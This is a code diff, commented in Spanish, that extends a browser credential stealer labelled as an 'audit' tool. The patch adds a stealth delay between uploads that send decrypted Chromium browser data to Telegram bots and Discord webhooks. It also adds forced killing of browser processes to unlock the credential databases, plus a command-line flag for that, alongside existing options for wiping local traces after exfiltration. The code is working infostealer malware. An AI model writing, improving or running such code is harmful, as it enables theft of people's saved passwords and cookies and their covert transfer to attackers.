@@ -27,7 +27,9 @@ CONFIG = {
     "ds_webhook": "",  
     "stealth":    False,
     "output_dir": ".audit",
-    "delay":      0      
+    "delay":           0,
+    "send_delay":      0,
+    "webhook_timeout": 15
 }
 # =========================================================================
 
@@ -161,29 +163,40 @@ def retry_request(func):
     return wrapper
 
 class Exfiltrator:
-    def __init__(self, telegram_token=None, telegram_chat_id=None, discord_webhook=None):
+    def __init__(self, telegram_token=None, telegram_chat_id=None, discord_webhook=None, timeout=None):
         self.tg_token = telegram_token
         self.tg_id    = telegram_chat_id
         self.ds_hook  = discord_webhook
+        self.timeout  = timeout if timeout is not None else CONFIG["webhook_timeout"]
 
     def send_files(self, file_paths):
-        for p in file_paths:
-            self.send_to_telegram(p)
-            self.send_to_discord(p)
+        """Sends files with an optional inter-file delay for stealth."""
+        if not file_paths: return
+        
+        for i, path in enumerate(file_paths):
+            if i > 0 and CONFIG["send_delay"] > 0:
+                logger.info(f"Esperando {CONFIG['send_delay']}s antes del siguiente envío...")
+                time.sleep(CONFIG["send_delay"])
+                
+            try:
+                if self.ds_hook: self.send_to_discord(path)
+                if self.tg_token and self.tg_id: self.send_to_telegram(path)
+            except Exception as e:
+                logger.error(f"Error enviando {path}: {e}")
 
     @retry_request
     def send_to_telegram(self, file_path):
         if not self.tg_token or not self.tg_id: return False
         url = f"https://api.telegram.org/bot{self.tg_token}/sendDocument"
         with open(file_path, 'rb') as f:
-            r = requests.post(url, data={'chat_id': self.tg_id}, files={'document': f}, timeout=REQUEST_TIMEOUT)
+            r = requests.post(url, data={'chat_id': self.tg_id}, files={'document': f}, timeout=self.timeout)
         return r.status_code == 200
 
     @retry_request
     def send_to_discord(self, file_path):
         if not self.ds_hook: return False
         with open(file_path, 'rb') as f:
-            r = requests.post(self.ds_hook, files={'file': f}, timeout=REQUEST_TIMEOUT)
+            r = requests.post(self.ds_hook, files={'file': f}, timeout=self.timeout)
         return r.status_code in (200, 204)
 
 class ChromiumDecryptor:
@@ -198,6 +211,15 @@ class ChromiumDecryptor:
             "Opera":    self.roaming / "Opera Software/Opera Stable",
             "Opera GX": self.roaming / "Opera Software/Opera GX Stable",
         }
+        self.browser_processes = ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "vivaldi.exe"]
+
+    def kill_browsers(self):
+        """Forcefully closes browser processes to release database locks."""
+        import subprocess
+        for proc in self.browser_processes:
+            try:
+                subprocess.run(f"taskkill /F /IM {proc} /T", shell=True, capture_output=True)
+            except: pass
 
     def get_key(self, path):
         ls = path / "Local State"
@@ -237,7 +259,7 @@ class ChromiumDecryptor:
                 if db.exists(): targets.append({"name": name, "profile": p.name, "db_path": db, "key": key})
         return targets
 
-    def audit(self, output_dir: Path, skip_html=False, skip_csv=False, browser_filter=None, callback=None):
+    def audit(self, output_dir: Path, skip_html=False, skip_csv=False, browser_filter=None, callback=None, auto_kill=False, webhook_timeout=15):
         def log(msg, level="info"):
             if callback: callback(msg, level)
             else: getattr(logger, level)(msg)
@@ -270,6 +292,16 @@ class ChromiumDecryptor:
             finally:
                 if conn: conn.close()
                 tmp.unlink(missing_ok=True)
+
+        # --- FALLBACK INTELIGENTE ---
+        # Si no se encontró nada y auto_kill está activo, reintentamos cerrando navegadores
+        if not data and not filtered and auto_kill:
+            log("No se detectaron datos. Reintentando con cierre forzado de navegadores...", "warning")
+            self.kill_browsers()
+            import time
+            time.sleep(1.5)
+            # Llamada recursiva con auto_kill=False para evitar bucles infinitos
+            return self.audit(output_dir, skip_html, skip_csv, browser_filter, callback, auto_kill=False)
 
         if not data and not filtered: return None, None, None
 
@@ -318,6 +350,7 @@ def main():
     en.add_argument("--delay", type=int, default=CONFIG["delay"])
     en.add_argument("--clean", action="store_true")
     en.add_argument("--stealth", action="store_true", default=CONFIG["stealth"])
+    en.add_argument("--auto-kill", action="store_true", help="Cerrar navegadores automáticamente si falla la lectura")
     en.add_argument("--no-wipe", action="store_true", help="No eliminar archivos locales tras exfiltrar")
     en.add_argument("--debug", action="store_true", help="Activar logs detallados")
     
@@ -345,14 +378,14 @@ def main():
     tg_c = args.tg_chat_id or safe_b64_decode(CONFIG["tg_chat_id"])
     
     auditor = ChromiumDecryptor()
-    results, hp, cp = auditor.audit(out, args.no_html, args.no_csv, args.browser)
+    results, hp, cp = auditor.audit(out, args.no_html, args.no_csv, args.browser, auto_kill=args.auto_kill)
     
     if results and args.json:
         jp = out / f"audit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
         with open(jp, 'w', encoding='utf-8') as f: json.dump(results, f, indent=4, ensure_ascii=False)
     
     if results and not args.no_exfil:
-        exf = Exfiltrator(tg_t, tg_c, ds_w)
+        exf = Exfiltrator(tg_t, tg_c, ds_w, timeout=args.delay or 15)
         files = [p for p in (hp, cp) if p and p.exists()]
         if files:
             exf.send_files(files)
